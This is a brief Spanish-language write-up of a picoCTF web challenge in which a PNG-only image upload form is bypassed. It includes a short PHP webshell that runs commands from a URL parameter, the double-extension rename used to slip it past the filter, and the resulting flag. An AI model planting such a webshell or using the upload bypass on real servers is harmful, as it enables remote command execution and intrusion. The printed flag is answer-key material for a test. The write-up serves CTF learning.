## Descripción 
I found a web app that can help process images: PNG images only!
Additional details will be available after launching your challenge instance.
[here](http://atlas.picoctf.net:64753/)!
## Solución 1

Primero nos metemos al link de la página y nos dice que carguemos un archivo, cargamos uno aleatorio y nos da error. Nos metemos al link con /robots.txt y siguiente /instructions.txt.
Después nos metemos a consola y creamos un archivo php webshell, copiamos el archivo `webshell.php` con una nueva extensión doble `webshell.php.png` y renombramos el archivo a `webshell.png.php`. Y por último cargamos el archivo con /uploads y cargamos el archivo que resulta

```
vsalazarz@lap:~$ nano webshell.php
	<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
vsalazarz@lap:~$ cp webshell.php webshell.php.png
vsalazarz@lap:~$ mv webshell.php.png webshell.png.php

index.php
instructions.txt
robots.txt
uploads

G4ZTCOJYMJSDS.txt

flag: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}
```
